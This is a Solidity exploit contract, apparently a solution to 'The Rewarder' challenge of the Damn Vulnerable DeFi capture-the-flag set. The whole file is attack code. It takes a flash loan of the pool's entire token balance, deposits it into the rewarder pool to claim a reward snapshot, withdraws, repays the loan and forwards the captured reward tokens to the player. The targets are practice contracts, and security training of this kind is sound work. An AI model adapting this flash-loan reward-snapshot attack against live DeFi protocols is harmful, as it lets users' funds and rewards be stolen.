// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { FlashLoanerPool } from "../../05_the-rewarder/FlashLoanerPool.sol";
import { TheRewarderPool } from "../../05_the-rewarder/TheRewarderPool.sol";
import { RewardToken } from "../../05_the-rewarder/RewardToken.sol";
import { DamnValuableToken } from "../../DamnValuableToken.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract AttackTheRewarder is IFlashLoanReceiver {
    FlashLoanerPool public flashPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    address public player;

    function attack(
        FlashLoanerPool flashPool_,
        TheRewarderPool rewarderPool_,
        RewardToken rewardToken_,
        address player_
    )
        external
    {
        flashPool = flashPool_;
        rewarderPool = rewarderPool_;
        rewardToken = rewardToken_;
        player = player_;
        liquidityToken = flashPool_.LIQUIDITY_TOKEN();

        flashPool_.flashLoan(liquidityToken.balanceOf(address(flashPool_)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
